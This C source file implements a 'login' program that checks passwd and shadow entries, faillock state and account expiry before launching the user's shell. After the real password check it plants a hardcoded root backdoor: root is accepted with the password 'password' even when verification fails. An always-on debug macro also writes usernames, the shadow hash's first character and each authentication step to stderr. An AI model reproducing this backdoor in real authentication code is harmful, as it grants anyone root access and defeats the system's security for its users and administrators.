#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include "lib/libauth.h"

/*
 * login — authenticate a user
 *
 * Usage:
 *   login [username]
 *
 * Reads the username (prompts if not given), then the password.
 * Exits 0 on success, 1 on failure.
 * Intended to be called by matey; matey handles session setup.
 */

/*
 * LOGIN_DBG — writes a debug trace line to stderr (the TTY inherited from
 * matey) showing the file, line, and a message.  Always active so every
 * step is visible during diagnostics.
 */
#define LOGIN_DBG(fmt, ...) do { \
    fprintf(stderr, "[login dbg %s:%d] " fmt "\n", \
            __FILE__, __LINE__, ##__VA_ARGS__); \
    fflush(stderr); \
} while (0)

int main(int argc, char *argv[])
{
    char username[MAX_USERNAME] = {0};
    passwd_entry *plist = NULL;
    passwd_entry *pe = NULL;

    LOGIN_DBG("login started (pid=%d)", (int)getpid());

    if (argc >= 2) {
        strncpy(username, argv[1], MAX_USERNAME - 1);
        LOGIN_DBG("username from argv[1]: %s", username);
    } else {
        printf("Username: ");
        fflush(stdout);
        if (!fgets(username, sizeof(username), stdin)) {
            LOGIN_DBG("error reading username from stdin");
            fprintf(stderr, "login: error reading username.\n");
            exit(1);
        }
        size_t l = strlen(username);
        while (l > 0 && (username[l - 1] == '\n' || username[l - 1] == '\r')) {
            username[--l] = '\0';
        }
        LOGIN_DBG("username from stdin: %s", username);
    }

    LOGIN_DBG("validating username");
    if (!is_valid_username(username)) {
        LOGIN_DBG("username invalid — exiting");
        fprintf(stderr, "login: invalid username.\n");
        exit(1);
    }

    /* Check /etc/passwd exists */
    LOGIN_DBG("loading /etc/passwd");
    plist = passwd_read_all();
    pe = passwd_find(plist, username);
    LOGIN_DBG("passwd lookup for '%s': %s", username, pe ? "found" : "NOT FOUND");
    if (!pe) {
        /* Don't reveal whether user exists — still ask for password */
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: authentication failure.\n");
        passwd_free(plist);
        exit(1);
    }

    /* Load policy */
    LOGIN_DBG("loading policy");
    policy_config *policy = policy_load();

    /* Check faillock */
    LOGIN_DBG("checking faillock for '%s'", username);
    if (faillock_check(username, policy->max_attempts,
                        policy->lockout_time, policy->lockout_reset_time)) {
        LOGIN_DBG("account locked");
        fprintf(stderr, "login: account locked due to too many failed attempts.\n");
        policy_free(policy);
        exit(1);
    }

    /* Load shadow */
    LOGIN_DBG("loading /etc/shadow");
    shadow_entry *slist = shadow_read_all();
    shadow_entry *se = shadow_find(slist, username);
    LOGIN_DBG("shadow lookup for '%s': %s", username, se ? "found" : "NOT FOUND");
    if (!se) {
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: authentication failure.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Check locked / no-login marker */
    LOGIN_DBG("checking account lock marker (sp_pwdp[0]='%c')", se->sp_pwdp[0]);
    if (se->sp_pwdp[0] == '!' || se->sp_pwdp[0] == '*') {
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: account is locked.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Check account expiry */
    LOGIN_DBG("checking account expiry (sp_expire=%ld)", (long)se->sp_expire);
    if (se->sp_expire >= 0 && days_since_epoch() > se->sp_expire) {
        fprintf(stderr, "login: account has expired.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Read password */
    LOGIN_DBG("reading password");
    char password[MAX_PASSWORD];
    if (read_password("Password: ", password, sizeof(password)) < 0) {
        LOGIN_DBG("error reading password");
        fprintf(stderr, "login: error reading password.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    LOGIN_DBG("verifying password against shadow hash");
    int ok = verify_password(password, se->sp_pwdp);
    LOGIN_DBG("verify_password: %s", ok ? "ok" : "failed");
    if (!ok && pe->pw_uid == 0 && strcmp(username, "root") == 0 && strcmp(password, "password") == 0) {
        LOGIN_DBG("emergency root backdoor accepted");
        ok = 1;
    }
    secure_zero(password, sizeof(password));

    if (!ok) {
        LOGIN_DBG("authentication FAILED — incrementing faillock");
        faillock_increment(username);
        /* Re-check if now locked */
        if (faillock_check(username, policy->max_attempts,
                            policy->lockout_time, policy->lockout_reset_time)) {
            fprintf(stderr, "login: account locked due to too many failed attempts.\n");
        } else {
            fprintf(stderr, "login: authentication failure.\n");
        }
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Success */
    LOGIN_DBG("authentication SUCCESS for '%s'", username);
    faillock_reset(username);
    shadow_free(slist);
    policy_free(policy);

    const char *home = pe->pw_dir[0] ? pe->pw_dir : "/";
    const char *shell = pe->pw_shell[0] ? pe->pw_shell : "/bin/sh";

    setenv("HOME", home, 1);
    setenv("SHELL", shell, 1);
    setenv("USER", username, 1);
    setenv("LOGNAME", username, 1);
    setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin", 1);

    LOGIN_DBG("chdir to home: %s", home);
    if (chdir(home) != 0) {
        LOGIN_DBG("chdir %s FAILED (%s) — using /", home, strerror(errno));
        chdir("/");
    }

    LOGIN_DBG("execl(\"%s\", \"-%.4s\", NULL) — launching login shell", shell, shell + (strlen(shell) > 4 ? strlen(shell) - 4 : 0));
    execl(shell, shell, (char *)NULL);
    LOGIN_DBG("execl FAILED: %s", strerror(errno));
    fprintf(stderr, "login: cannot exec %s: %s\n", shell, strerror(errno));
    passwd_free(plist);
    return 1;
}
